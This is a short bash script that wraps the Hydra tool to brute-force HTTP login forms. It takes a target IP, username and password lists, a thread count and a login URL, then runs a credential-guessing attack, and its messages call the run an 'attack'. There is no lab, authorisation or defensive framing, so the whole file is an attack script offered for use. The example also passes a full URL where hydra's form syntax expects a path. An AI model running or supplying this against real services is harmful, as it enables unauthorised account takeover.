#!/bin/bash
# Hydra - Brute Force HTTP Login
# Options:
# -L : List of usernames
# -P : List of passwords
# -t : Number of parallel connections
# -f : Stop after first valid password found

# Usage: hydra_http.sh <target_ip> <username_list> <password_list> <threads> <login_url>
# Example script
# hydra_http.sh 192.168.1.1 usernames.txt passwords.txt 4 http://example.com/login

# Check if hydra is installed
if ! command -v hydra &> /dev/null
then
    echo "hydra could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 5 ]; then
    echo "Usage: $0 <target_ip> <username_list> <password_list> <threads> <login_url>"
    exit 1
fi

TARGET=$1
USERLIST=$2
PASSLIST=$3
THREADS=$4
LOGIN_URL=$5

echo "Starting HTTP brute force on $TARGET with $THREADS threads"

# Perform brute force attack
hydra -L $USERLIST -P $PASSLIST -t $THREADS $TARGET http-post-form "$LOGIN_URL:username=^USER^&password=^PASS^:F=incorrect"

echo "HTTP brute force attack completed."
